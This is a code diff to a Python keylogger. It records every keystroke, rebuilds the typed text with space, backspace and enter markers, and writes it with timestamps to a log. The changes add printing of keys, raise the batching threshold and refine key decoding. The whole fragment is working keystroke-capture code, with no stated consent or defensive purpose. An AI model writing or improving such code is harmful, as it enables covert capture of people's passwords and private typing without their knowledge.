@@ -8,16 +8,21 @@ count, keys = 0, []
 def on_press(key):
 	global keys, count
 	keys.append(key)
+	print(key)
 	count += 1
 
-	if count > 20 and 'space' in str(keys[-1]):
+	if count > 50 and 'space' in str(keys[-1]):
 		words = ''
 		for key in keys:
 			k = str(key).replace("'", '')
-			if k.find('space') > 0:
-				words += ' '
-			elif k.find('Key') == -1:
+			if k.find('Key') == -1:
 				words += k
+			elif k.find('back') > 0:
+				words += ' BACK '
+			elif k.find('space') > 0:
+				words += ' '
+			elif k.find('enter') > 0:
+				words += ' ENTER '
 
 		date = datetime.now()
 		write_log({date.strftime('%c'): words})
